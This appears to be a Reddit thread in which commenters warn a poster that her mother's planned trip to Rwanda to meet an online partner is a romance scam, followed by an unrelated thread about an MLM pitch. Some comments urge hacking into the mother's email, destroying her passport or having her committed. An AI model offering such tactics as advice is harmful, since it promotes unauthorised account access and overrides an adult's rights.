- Don‚Äòt let her become a drug mule or something similar. There was a recent case. Maybe search for ‚ÄûCanada China drug mule incident‚Äú
- I don‚Äôt know if this has been mentioned yet, but I‚Äôve seen other videos of elderly women traveling to meet their ‚Äúboyfriends‚Äù to be immediately proposed to for marriage when they land at the airport. High pressure and false affections to hook them into leaving the airport with them to some random hotel/apt where they are basically cut off from everyone. It‚Äôs so sad.
- What about asking him to get on another conference call, and then being more insistent with him to try to expose him?  You could say since he's such a world traveler, that you insist that he come visit her first.   Or that if she comes, a man is coming with her.  You could say that you want to do a background check on him and you want him, right now, to hold up his ID to the camera - that you need his name, address, phone, passport, etc.  See if he falters when he is pushed.

Also, maybe there is a way to stall your mom while you work on this.  Rwanda currently has Marburg Virus - maybe try to convince her that she can go see him, but just not right now.  This might work post-COVID.     


Just brainstorming here.  Who knows what might stick with your mom.  Best of luck.
- If he's on IG, can you do image searches of the posts he makes? Show her how it's done, maybe she can start to see what's really happening.

You might be able to find someone at her bank who can help, even get a guardianship if you can. Have you consulted a lawyer? Looked into Adult Protective Services to see if this can be shut down legally?

Honestly, I would go with her if that's an option for you. Bring a friend. Make sure she gets back safely.
- Look into adult services through your local city or county government. I'm assuming you've tried to reason with her, but they have experience with situations like this. Unfortunately it's a common thing
- Ugh, I‚Äôm sorry youre dealing with all this. My advice would be  to have her call the Nigerian embassy and tell them her story. They‚Äôll waste no time in telling her it‚Äôs a scam. And she might be more receptive if it comes from someone ‚Äòofficial‚Äô. After all, there‚Äôs every chance this scammer is trying to isolate her from family because ‚Äòthey can‚Äôt understand our love‚Äô, ‚Äòthey don‚Äôt want you to be happy‚Äô etc etc.
- Try to "displace" her passport at the last minute.

You don't want her to go to Africa.
- He is going to propose to her on airport arrival
- From a medical worker: consider contacting her GP. I‚Äôm not sure how the options work in your country but in the US, where I practice as a nurse, catfish-type scamming like this is common in vulnerable patients. We bring in the doctor, the social worker, and Adult Protective Services to assess the situation and, if justified, to ensure someone with full faculties takes on decision making for the patient. This can protect their finances too.
- There is a good chance a "snag" will come up to abort the visit. This usually involves the scammer needing money for some emergency.
- Maybe try your local area Facebook groups and write this up asking if there‚Äôs anyone who‚Äôs from Rwanda or knows someone from there that could come talk to her in person about how dangerous it is there and about this likely being a scammer. Maybe someone with first hand knowledge can get through her.
- I just had an idea, call the US Embassy in Rwanda (yes there is one) and explain the situation. Maybe someone there can call your mom and tell her what a bad idea this is.
- He won‚Äôt show but someone else will to kidnap her. It‚Äôs a setup.
- From the state department:

Mom's passport (if she even has one) needs to be valid for 6 months after her arrival in Rwanda. She will need to obtain a tourist visa before or upon arriving at the airport. She can get a 30 day visa at the airport upon arrival but if she intends to stay longer she'll have to contact the Rwandan embassy in DC before traveling. There is a vaccination requirement for yellow fever but that only applies to those traveling from areas with active outbreaks or where it common.  

Based on how you're describing her, she might stall out once she actually sees what the Rwandan government requires as part of the visa process. For example, thry want to know wgere she'll be staying.
- If he works in stock trading and travels all over the world he should be able to meet her in a nicer/safer country than Rwanda. How about Greece, or Portugal, or Morocco?
- Once she is in Rwanda he will call call and say " I'm here stuck at the airport they need this and that then the customs then plenty of other dollar involves" we looking at big money scam or just scam and go
- Go to social catfish . That's a you tube channel they have hundreds of videos of that stories like that and they even can help to verify the guy if he is real or not.
- Yep make her passport disappear
- If she can‚Äôt be talked out of it someone should go with her. She may agree to that compromise. Most of Rwanda is relatively safe by African standards.
- As others have said, this is extremely dangerous. Her life is at stake. Literally.
- Pig butchering scam.

Show mom this post and read her the comments.
- Hope u have ransom money
- Obviously a scam. Storgly suggest you insist that a family member travel with her to help her through immigration, customs. hotel, local transportation and so on. If this guy is going to be part of the family neither he nor she should object to a meeting.
- Have your mum watch the movie 419, it's on Tubi right now.
- Cut her passport up. Deal with the consequences later
- Do not let it go do not let it go
- Take your mom‚Äôs passport and hide it. She it‚Äôs unlikely that she can‚Äôt get a passport within 3 weeks and will miss her flight.
- Rwanda isn't a good place to be
- I am sorry this is happening. This is your mother! You know you need to stop her! Not try to stop her - stop her. It will turn ugly as soon as she steps there. She does not see and most likely will not see what is happening. Last thing you want it to turn into kidnappings. 

If she does not listen - well - quietly find her passport and shred it! It will win you sometime. Find way to secure her finances. Hack in her emails block him, block on social media, cells phone, etc. Do not tell her yet. I stand by every word I said. If my mother was alive I‚Äôd do all of it and more! Anything. Anything at all!
- > They had agreed to meet in Rwanda as he claims Nigeria is not a safe country

https://en.wikipedia.org/wiki/Rwandan_genocide

> The Rwandan genocide, also known as the genocide against the Tutsi, occurred from 7 April to 19 July 1994 during the Rwandan Civil War.[4] Over a span of around 100 days, members of the Tutsi ethnic group, as well as some moderate Hutu and Twa, were systematically killed by Hutu militias. While the Rwandan Constitution states that over 1 million people were killed, most scholarly estimates suggest between 500,000 and 662,000 Tutsi died.
- I believe the angle is that once she gets there, he takes her passport so she can't leave and then bleeds her accounts dry.

Do whatever you can to stop her from going. Hide her passport if you have to. She's probably not old enough for adult protective services to get involved, but it might be worth giving them a a call to see if they can at least advise you on what to do.
- Do a reverse photo check on his pic.
- Scary. My mom was scanned a couple times and ended up spending 1000's $$$ sending gift cards and cell phones somewhere in Africa.¬†
She ended up going bankrupt.¬†


This may sound harsh, but if all else fails, and you want her alive, see about having her Baker Acted. At least it will lock her up for a few days and she can't fly out.¬†


Check into it before you get close to her flight so you will know exactly what to do.¬†


Also, talking to the police about what is going on, they may be able to give you some direction to resources.
- You could call and speak with TSA and the closest US embassy near you and the airline ahead of time and explain what‚Äôs happening. They can put a stop to it and you need to try that before the day comes to fly. If you‚Äôre not American or don‚Äôt live in the US, you can contact any embassy/consulate in the country you live in.
- I would check her passport for a visa? US citizens require a visa, it takes about 8 days to get in advance, she can get one on arrival for a fee, but you do need a place to stay booked and funds for your holiday.
- I would advise her to plan as an alternative as though he weren't going to meet here there. If she is determined to go on this trip she needs to have a back up plan for if he doesn't show. Help her find hotels or hostels she can stay at and some sights to see while she is there. Since she is determined to go at least make it worth the money she spent.
- Find her passport and hide it. 
Then put on the best episode of 90 day fianc√©e you can find where this gets exposed.
- Have her watch this: https://youtu.be/L_u0c_FPVhA
That's what might happen to her.
- Personally I‚Äôd go to her bank and tell them what‚Äôs happening. Try and get her card blocked
- Why are the boomers so susceptible to these scams. They don‚Äôt think how dangerous this could be?
- Have her watch videos like this
https://youtu.be/vthPmLORVrM?si=LU6mmOlqVqVFTYZV


https://youtu.be/vtO0ASfaXmQ?si=Mtjxvg-_S0GFhH0X


https://youtu.be/mCj6rpDmvkQ?si=Xb6THX7qUxertXHC
- Contact your equator the State Dept, maybe there are travel bans to those countries or at least register her as possibly traveling to track her but seriously DO NOT LET HER GO.
- 90 day fiance‚Ä¶watch Angela and Michael‚Ä¶it‚Äôs a long, long con.
- Is this the same mum that gave away over $300,000?  Or is that a different OP?
- Go with her.
- She's going to end up alone and penniless in Rwanda.....
- Destroy her passport. Shut down her internet. Monitor and restrict her bank account.
- Google "Cocaine Buttons". A Canadian woman your mom's age was scammed, tricked after going to Nigeria to meet her "lover". She ended up in Hong Kong with a suitcase full of new clothes her "lover" had sent her. The buttons on these clothes were pure cocaine....2 kgs worth. She ended up in jail. Hard to imagine someone would fall for this. She had been romance scammed before this and had written a book about it. Look this up, it's insane!
- If you believe your relative is being scammed into traveling overseas, you should contact the U.S. Department of State's Overseas Citizens Services. You can also reach out to the nearest U.S Embassy or consulate in the country where your relative is planning to travel.

If you are proactive in contacting these entities, you may be able to help expose the ruse, and protect your loved one.

Going "pear shaped" can include her getting kidnapped for ransom, by the way.

- the !romance and !crypto bots have some good info. 

these scammers prey on the young, the vulnerable, the elderly who are lonely and they are quite good at stealing people‚Äôs money. be aware that financial indiscretion is often a sign of a mental decline (often in the elderly a sign of dementia or alzheimer‚Äôs disease). your relative could need to be medically assessed. furthermore they might need someone to step in like a trusted financial advisor or family member who takes control (or at a minimum has oversight) over their financials, living situation, revoking a license to drive, or whatever else needs to happen so they can‚Äôt harm themselves or their families. 

according to [this federal trade commission](https://www.ftc.gov/news-events/data-visualizations/data-spotlight/2023/02/romance-scammers-favorite-lies-exposed) article, *‚ÄùIn 2022, nearly 70,000 people reported a romance scam, and reported losses hit a staggering $1.3 billion. The median reported loss: $4,400.‚Äù*

this law [SB 278: Elder abuse: emergency financial contact program](https://digitaldemocracy.calmatters.org/bills/ca_202320240sb278) is in progress and with bipartisan support should be enacted soon.

- Also, Nigeria is safe in some areas. My brother is married to a Nigerian and she travels home often to visit her family and friends, and they often come to the States to visit us. If things were unsafe, they wouldn't go backüòÇ
- Yeah we have been discussing how to approach this. She will end up exactly like this guy if she continues. No one in our family has the means to support her, nor will we want to if she decides to pursue this after we have warned her.
- and this one,  not the same story but [https://metro.co.uk/2025/01/14/woman-scammed-830-000-believing-dating-brad-pitt-22355924/](https://metro.co.uk/2025/01/14/woman-scammed-830-000-believing-dating-brad-pitt-22355924/)
- Right? I just said sat in airport for hours stood up by this mystery guy is best case lol
- First she'll be kidnapped, forced to empty any and all accounts she can access. Then it'll turn to ransom to shake her entire family and social circle. Once the well runs dry, they'll make her disappear.

Seriously OP; Rwanda is a poor-as-fuck, war-torn dictatorship. Your mom is safer in the poorest of US neighbourhoods than she is in Rwanda.
- Elderly? She's 60!
Otberwise I totally agree. At least the scammer didn't convince her to fly to Nigeria. Although I'm not sure how much safer Rwanda will be.
- Dude 60 is not elderly
- Elderly? She's 60. Elderly is 80. :)
- > There are stories of people sitting in airports for hours waiting for their scammer to meet up with them, people having to get a hotel to stay at and wait out until their return trip home

If it gets this far, this is the *best* case scenario.
- I tried to at least warn her to book her own hotels and travel if she ends up going. I hadn‚Äôt considered she‚Äôll probably go straight to him and ask where she should book things through. It seemed like they had been discussing what hotels she should stay at
- Hi /u/ditzen, AutoModerator has been summoned to explain the Romance scam.

Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

- That‚Äôs exactly what we told her. Why doesn‚Äôt he visit here and we can all meet this mystery man together? His excuse is his visa has been declined to travel to Australia and he is currently applying for another one (obvious red flag of course). She says she doesn‚Äôt want to wait any longer and has to do this. It‚Äôs absolutely baffling to me that she can‚Äôt see through the bullshit, but it‚Äôs been 4 years of daily communication, the lies run so deep it‚Äôs gotten out of hand before we even knew about it.
- I am dealing with my elderly mom , age 83 , who has discovered internet dating. I convinced her to put me on her financial accounts, and I have had a private discussion with the bank. I pay for background checks on the men she hooks up with, so far they are all human but very sketchy. I never thought this is what I would have to deal with in her last years.  The doctor says it is probably the start of dementia, but not bad enough to take legal matters.
- I agree. I fully believe if she gets on this plane she won‚Äôt return. Either that or she‚Äôll lose everything she has
- Agree on the passport thing
- Agree. Take the passport a week before the trip. She will think she lost it and have to reschedule the trip.
- Yes! Do this!
- She needs to divorce and block him!!
- As far as marriages go this sounds pretty good.
- Her health issues are all minor, sore feet so she can‚Äôt walk far, brain fog and lack of concentration so she quits things easily. I don‚Äôt think she‚Äôs considered how tough solo travel can be, even if this were really a legit trip
- This is good.
- Who paid for your air ticket
- This is a good plan. I've seen this part play out, & there can be a very long period of time when talking almost makes it worse. They get coached, & coached well. You have to take action that makes her next step impossible.
- Can I ask - why did she stay after she found out he had a wife? & was she just staying with his family in India or did she just decide to stay there after she got dumped? I‚Äôm so sorry this happened to your family
- Is she the woman who had on a sweater the scamers gave her? The buttons on the sweater were made of coke/fent, and the women went to prison in China? It seems similar to the show I watched. If it's not, there is another older lady who went over to Africa ended up in China and landed herself in jail for drug smuggling.
- I would tell my mom I thought about it and I at least want to drive her to the airport. I would grab her passport and burn it.
- Exactly, once you are the "scammed" list, you are a mark. And odds are good you will be scammed over and over. People don't learn.
- Worst case she‚Äôs held captive and eventually dies‚Ä¶
- "this could be real" ---- we shouldn't even say this.  It is NOT real.  zero chance.  not even the slightest of possibilities.  When you start to get familiar with these scams, you have to leave out the chance they are real.  This guy is half her age... he has zero reason to randomly find her across the world online and decide she is a "Great friend" and want her to fly out and meet him.  Plus add in that crypto has been mentioned.  It's not real.
- *Rwanda
- You can visit a certain office and get an expedited  one in days. It costs and it‚Äôs not in every city, mostly major cities. My closest one is Miami, 4 hours south of me.
- This was depicted in movie Hotel Rwanda (very good movie)
- Airlines can‚Äôt do anything .
- [deleted]
- OPs mother is Australian, not American.
- This doesn‚Äôt really ever get exposed on 90 Day because no scammer is going to agree to be filmed for a reality show. The US cast members who were most likely talking to scammers have all ended up diverting to other ways of embarrassing themselves through their own delusion.
- Loneliness. Depression. It‚Äôs why they are targets.. When my mom passed, I found her journals. She was so very lonely. Her bf passed as did her best friend. 3 of her 4 kids moved 1100 miles away (I went back at least twice a year, my siblings did not) 

She never told me bc I would have helped or even moved back. But I also chatted with her about scams constantly. She did her due diligence, I must admit. She would want to sign up for something and would read the fine print and circle it and call the company about that fine print. She never got scammed. (Aside from one of those stupid extended warranty places , can‚Äôt remember the name, which is useless )

Boomers aren‚Äôt the only ones to fall for these. They do make up a large portion but they don‚Äôt make up 100% of those scammed. 

I just turned 50. Technology is slowly escaping me. I can‚Äôt keep up, it changes so fast.  Your brain doesn‚Äôt always work as well as you age. Things change and we all age. I was glib and thought I would be young forever. It flies by  so so very fast.
- That‚Äôs not me. This is the first I‚Äôm posting about it, we only discovered this on Saturday
- You can‚Äôt just do that , even if it‚Äôs family. People have rights. To do this, would need to have POA or a conservatorship. 
She could actually get her kids arrested if they did this.

- >you now need to be on the lookout for out for recovery scammers‚Ä¶

Why? The OP hasn't lost any money yet. It's not helpful to spam the comments with a large copypasta that doesn't fully apply to this situation, and summons the automods for no reason.
- Hi /u/vikicrays, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Hi /u/vikicrays, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- You might be able to get someone at the local branch to talk to her and confirm that scams like this are very real.  Local police would probably do it too.  But that's all they can do, they can't stop her.
- Maybe it‚Äôs an Aussie expression? Just means everything goes wrong
- Yep in uk it is
- You're speaking about natives to Nigeria. Of course, they come and go and are treated well. As with the "some safe areas" you speak of. How would this woman who is traveling there know if it's a safe area or not? You could have provided some great insight about specific cities there. Instead, you post a snarky, unnecessary comment that adds nothing to the convo.
- Listen to the comments about being robbed/kidnapped/murdered.

It‚Äôs a VERY REAL possibility.

Here‚Äôs an example for you of a woman who was held against her will for a YEAR in Nigeria.  Btw, Rwanda will **NOT** be safer‚Ä¶!  Rwanda is a ***FAR POORER COUNTRY*** than Nigeria‚Ä¶

[https://www.bbc.com/news/world-africa-53390397](https://www.bbc.com/news/world-africa-53390397)

And here‚Äôs another.  This woman **DIED** just a couple of days after being freed and returning to the US.  She was convinced until the last that she was finally released out of kindness, but in fact they most likely let her go because she was _NEAR DEATH_ and they didn‚Äôt want the extra attention from her ultimate demise:

[https://www.newsweek.com/woman-romance-scam-loses-home-taken-captive-dies-1734112](https://www.newsweek.com/woman-romance-scam-loses-home-taken-captive-dies-1734112)

These are just a couple.  In fact at least one of the links above mentions yet another victim held against her will, a Filipina woman.  You can search for more articles out there about yet others.

I would HIGHLY recommend you do ***EVERYTHING*** you can to keep your mum from going, **WHATEVER** it might take‚Ä¶!

Take care and good luck.  You will need it.
- Could it be he‚Äôs trying to marry her for her passport? Very common.
- I would hide her passport.
- The fact that he has no plans and didn't have a hotel booked makes me fear for her safety. Like someone else commented with articles about abduction- i think that's a very real possibility for your mom.

They will keep her and drain her of all her money. Maybe try to ransom her back to you; but they'll take everything she has 1st, and like you said, she has health issues so for them that's a bonus. If she were to die she was already sick so they couldn't be blamed for it and such.
- Happy Cake üéÇ Day, intenseskill
- Good point and Happy Cake Day!
- 60 but in poor health, naive and easily manipulated. Forget the internet scammer, as soon as she walks out of the airport shes getting scammed by taxi drivers, street vendors, the works!

OP theres a million different ways this could all go south. Best worst case scenario, he just doesnt show up. Worst worst case, she gets kidnapped and held for ransom or a thousand other things. 

If you really want to humour her, and give her a memorable trip, go with her! Do NOT let her leave with the scammer if he shows up, book your own hotels and be the red flag waver any time something comes up.
- And the scammer tells her she's "smart and funny and all that scammer stuff." No wonder the poor woman has fallen for this. When she talks to him, she's an exciting person who is going on an adventure, and with her family, she's "naive and easily manipulated." 

This is one of the reasons they fall for these scams and won't let go.

I agree she's being scammed and shouldn't go, but this post says why this happens to vulnerable people.

OP, if she has tickets, you go with her. 

People have gone and either been left at the airport or taken somewhere where they are vulnerable.

One thing you can do is say you want her to be healthy and happy on the trip, so arrange a visit for a checkup and any vaccinations or meds she might need to take with her. That might make her see this isn't a walk in the park.

Good luck.
- I was going stay this too.  60 isn‚Äôt ‚Äúelderly.‚Äù
- Rwanda will NOT be safer.
- It is when you're 14
- 60-80 is the last quartile of most people's lives. It's elderly.
- Exactly! The worst case scenario is OP's mother doesn't come home. OP needs to stop their mother from going before their mother's body is never found
- DUDE.
you gotta stop her from going.
- There was a reddit post maybe two years ago about a woman who did all the things your mother is doing.   I wish I could find it but unfortunately, there are so many posts like it that it is impossible.  The end of the story was the mom made it back all right after being ghosted at the airport.  The man came up with an excuse (I think his kid was sick in the hospital) which she believed and continued sending him money.

No matter what she is saying, she is sending him money.  It might be in the form of gift cards so she doesn't think it counts or she is flat out lying.  "I'm not using Western Union so it isn't a scam!"

I would maybe look into helping her... lose her passport.  Ask her some basic questions:

What is the currency in Rwanda?

What language is most common?

Where is the closest US embassy?

What happens if you get injured?

Will you have a vehicle to travel around in?

What side of the road do they drive on?

What inoculations do you need to travel there?

You can make it seem like innocent questions, like you just want to know more about Rwanda but your mom is in so deep it feels like the only way to get her to not do this is to scare her with her lack of knowledge.   There is a [current advisory](https://travel.state.gov/content/travel/en/traveladvisories/traveladvisories/rwanda-travel-advisory.html):

Exercise increased caution in Rwanda due to an outbreak of **Marburg Virus Disease** and at the Rwanda-Burundi border due to **armed violence**. Some areas have increased risk. Read the entire Travel Advisory.

  
My family hasn't traveled to Africa for a long time (more than a few decades) but travel there wasn't easy in terms of the length of flights and transfers.  It was exhausting.
- Find out what reasonably safe country he can travel to and offer to take a family vacation there where the meeting can take place.  I'm sure he will have 'reasons' why that won't work but it is worth a shot.
- You will never win this using logic and reason. She's beyond that for now. The scammer is giving her something - a fantasy - that means much, much, more to her than reason. She sounds incredibly lonely and they're able to tap into that.
- It‚Äôs getting into illegal territory, but at that point I‚Äôd try to hide/destroy the passport.
- It also occurs to me that if he is currently in Nigeria (and is well off and travels the world) then it‚Äôs absolutely perfectly safe for her to go there because he would live in a house or apartment with security as do all other wealthy Nigerians. He would likely be based in Lagos or Abuja. 

However, of course he is probably none of those things. He‚Äôs likely to live in a village where people know him and where a white woman turning up would be extremely unusual and noticed by everybody. (I spoke to a scammer once who told me he hadn‚Äôt ever seen a white person in real life and he was at college in a large town in Edo State) 

If he has any bad intentions towards your mother , he can‚Äôt really execute them in full view of his community. But instead of going to another country where she would be entirely safe, he suggests a country where he won‚Äôt be known (presumably) and where he can disappear without trace. 

I would also try suggesting that  any trip will be arranged with the full co-operation  of a private security firm in Rwanda who could track her whereabouts and make welfare checks and see how that is taken (obviously a made up suggestion, but it‚Äôs worth a try?)
- Hey mate you can contact the AFP and ABF to let them know. Worst case scenario she takes off suddenly without your knowledge they can intervene to talk her out of leaving the country. You may also ask to speak to your state police financial crimes or fraud squad. They frequently deal with these scenarios. You don‚Äôt want her going to Africa. Best case scenario this dude marries her to get a visa. Worst case she becomes a drug mule or is murdered.
- Has she mentioned him before? She said she's known him for 4 years. Has she really or has he encouraged her to say that to put people at ease?
He travels worldwide, so why doesn't he come to see her?

Is she on any medication that may prevent her from flying? Like maybe blood pressure or something? 
If she has actual tickets, could she mysteriously lose them? 
Is her passport invalid, or can it be damaged so that it won't be accepted?

I have alarm bells ringing all over for your mum!!
- It would be interesting to see what happens if you offer to go with her (if you are male) or if a male relative offer to go with her. 
See how enthusiastic the crypto world traveller is about that?
- Lol, she's saving up to go visit him again so they can have sex
- I have a crazy idea, hire a handsome middle-aged actor to bump into her at the grocery store and start to romance her. Pay him to charm her and date her. It would be cheaper than what would happen to her if she ever makes it out of the country.
- Does Australia have any laws against elder abuse that might help you gain control of her finances? I know this is uncomfortable for you, it‚Äôs AWFUL, but maybe a conservator ship is in order. Not a quick fix, but might help in the future. I‚Äôm sorry you‚Äôre going through this OP.
- I did‚Ä¶of course‚Ä¶she wasn‚Äôt paying for anything‚Ä¶I told her that I would pay for the stuff we did together but I wasn‚Äôt going to pay to get her car fixed, or pay her phone bill so it didn‚Äôt get cut off, or her sick sister‚Ä¶Seriously, she tried everything once she had switched from the big fattening to the pig slaughter!
- Just crossed my mind, even easier, just hide her passport.

Job done, she's grounded.
- She found work and a place to live. They did have a relationship, I don‚Äôt know much more than a few passing comments. I think she didn‚Äôt know what to do with herself. So, see if she could build a new life in a completely different world?
- What show is this? It's not the locked up abroad is it? I wish they had a scammer tv show where people go out of the country but they bring undercover tv crew. To bad OP can't take over the money. I'm 30F & scared for this 60F mom.
- I think that's it. She was from Canada.
- Yeah, there's a "scammable" list that gets passed around & sold, & then there's also a "high-value mark" list that gets sold, which includes names & all info of people who were successfully scammed for substantial amounts (like $100K and up). Our friend is on the high value list. She tried to go back on dating sites after the first big disappointment, & she got hit over & over again by people who were supposedly from her state but were out of the country for cool & exotic reasons. I'll be back soon! I can't wait to see you! Oh, no! My car broke down & I'm stuck somewhere & can't get into my loaded bank account! She still doesn't believe that people are really that evil, let alone that the new saucy messages all came from the same group, waiting for her to pop up. But it's embarrassingly clear when you look at the language & structure & timing. All the same guys. If there's a hell, I sincerely hope they rot there.
- Rwanda is in Africa‚Ä¶
- Ok first I‚Äôm going to need you relax. Second, there are resources once they become aware of why they‚Äôre flying to Nigeria. Where a person will go through additional checks and have more information gathered before allowing her to board. Being spoken to by TSA and others there‚Äôs a good chance she will come to her senses and be delayed enough to where it‚Äôs no longer a choice of hers. No she won‚Äôt be arrested.
- They may know of the scam/scammer and can stop her flying out of the country!
Especially as she herself has brain fog issues!
- Oh ok.  Good luck though.
- You‚Äôre right, I replied out of passion and I shouldn‚Äôt have. I know it‚Äôs wrong, but I would lose her passport because who knows what will happen once she arrives to her destination.
- It is british. maybe the aussies stole it.
- worst case scenario and you cannot stop her going offer to go with her.

I am just talking from a pov of making sure she is safe. There is no way I would be letting my mother go to a foreign country to meet some random stranger. If she did I would be praying for the outcome of what the other guy said "sat in airport for hours".

That seems like a best case scenario to me.
- You're Australian? There's a possibility she could be used as a mule to smuggle drugs back to your country. Take this seriously.
- I agree with you completely plus I believe I seen she is a white woman so she will stand out. She has LOTS of money from her divorce settlement & has foggy confusion issues & can't be on her feet long & has never been to this country, this is a very great danger zone. I think the USA is crazy but never as scary as where she is going. Like others said Murdered, trafficked, held for ransom money after he's spent all her money because they think they can get more maybe from the family or more from her even though she won't have it, or her family just will never hear from her again, for all we know this could be a huge TRAP & he could be awaiting her to get there before they take her somewhere. She's going to stand out & going to be going through lots of poverty. Unless it goes great and they get married but I don't have a great feeling about it and I'm a stranger. OP please if she doesn't let you go please still buy a ticket for the same day time and plane if you can. But I would be calling her bank account like everyone else said report them stolen. Or file for power of attorney. I'm really scared for your mom and I am a reddit stranger. You came here to ask your questions because you also too have a bad feeling. Please call your family, anyone that can help support you locally on this, even your local police department show them all of this, tell them what you told us and I'm sure they will be able to talk to her. Consult an attorney for advice. Anything at this point. I know she isn't going to listen likely so you're going to have to stop her. Just think of what you're going to feel on the day or night she leaves and that plane lands and you are sick to your stomach waiting to hear from her and you have no clue what is going on and she's too far away to help her. This can't go good.
- I'm sorry if I hurt your feelings. Rwanda doesn't look to be any safer than Nigeria, but with him claiming to be from Nigeria, he should have known of safe areas to meet in. That's all I'm saying. I'm sorry if my "snarky" remark hurt you. All my comment was meant to do was further point out the cracks in this scam.

- In the UK it's called "sham marriage" and it's a big problem. The Home Office publishes a 72-page pdf document dealing with it.
- That's a good idea, although eventually she'll just get a replacement.
- Exactly my worry too, now he also knows that she has family maybe he thinks they‚Äôd be willing to / able to pay a ransom for her. Tourists have been kidnapped for ransom in other countries and I imagine her condition and lack of traveling experience wouldn‚Äôt make her a difficult target :(
- Ty <3
- I'm 74, & I wouldn't fall for this.
- I'll be 70 in two weeks.

Someone calls me "elderly", we may have to throw hands.

I would lose, because I'm old, but I'm not "elderly".

;)
- Yeah I'm 60 this year. I guess it is old to young people.
- 30 is elderly when you‚Äôre 14‚Ä¶
- 100%. I know it doesn‚Äôt feel good, OP, but you must protect your mother.
- Good advice thank you, will look into this
- What are AFP & ABF, please?
- He could marry her and the rest could still happen.  See relayed links.
- From what I remember it was a Canadian news show. But I feel the same way.
- Agreed!
- AMP link corrected.

Title: Approached with a ‚Äúbusiness opportunity‚Äù multiple times in the last few months
Body: Hi all,

In the last few months I‚Äôve been approached online in LinkedIn by a stranger, and by an old high school teammate of mine (on separate occasions) with very similar sounding ‚Äúbusiness opportunities.‚Äù I‚Äôm positive that the two occurrences are not related at all.

Long story short, I was reached out to out of the blue by them on different occasions about my interest in passive income on the side outside of my current 9-5 job. They both followed the same format of discussion:

- an initial call/brief to ask about my interest or desire for making money on the side on top of my job

- my understanding of business and familiarity with ‚Äúad related revenue‚Äù and ‚Äúprofit sharing‚Äù

- a brief description of their business (profit sharing via helping large corporations direct ad traffic online) and mentorship throughout this business 

Now here is where they diverge: the LinkedIn stranger had wanted me to purchase a book and read up on business - to which I laughed and declined. My old friend got me on the phone with his mentor, who told me there was a business meeting tonight from a reputable speaker in their organization (I looked it up, it is legitimately happening and at a Hilton hotel so I know it is nothing dangerous or a setup or anything).

My immediate reaction is - this is something pyramid-like or at the very least not quite as profitable as they make it appear - why else would unrelated people in this space be actively trying to recruit more and more strangers?

I am just curious as to if anyone knows of what this type of thing is, and if they have any more details they can provide me. I really don‚Äôt feel like going to this conference or talk tonight if it is just going to be a massive waste of my time.

Thank you!

EDIT: another thing that confuses me is as to how there is a meeting going on 10 minutes away from me - I live 2+ hours away from where these guys live and it‚Äôs making me wonder about the scale of such an operation

- Any time you hear the word ‚Äúopportunity‚Äù someone is trying to scam you.
- This is definitely a recruitment pitch for an MLM. Run very far away.
- All the elements you described, for both guys, including the book, the mentor, supposedly helping large corporations online, and everything else, matches the Amway script. It's Amway for sure.
- LinkedIn one just sounds like another stupid book selling guru, ignore it. The old friend one definitely sounds like an equally stupid MLM they are going to try and suck you into. The easy sign is how he immediately connected you with his "mentor" which is a guy just barely less green at sucking people into it than he is. That's how they operate. Do yourself a huge favor and just tell him no thank you, up front, and don't go. Even if it means "supporting a friend" because once you go, they'll do everything in their power to get you to sign up, and I bet you'll find out real quick that a seemingly decent attendance is actually 10% other suckers, and 90% already bought in folks who convince the other 10% aggressively to join
- There r lots of opportunities to work from home if u want extra money.   Check job sites like Indeed and others and I am sure you will find opportunities.  This one sounds like a high pressure scam.
- Thanks, yea I figured as much - I am more so just curious as to if anybody can enlighten me about what they‚Äôre trying to rope me in to, given that I‚Äôve been approached twice already in such a short window about it
- Thank you!
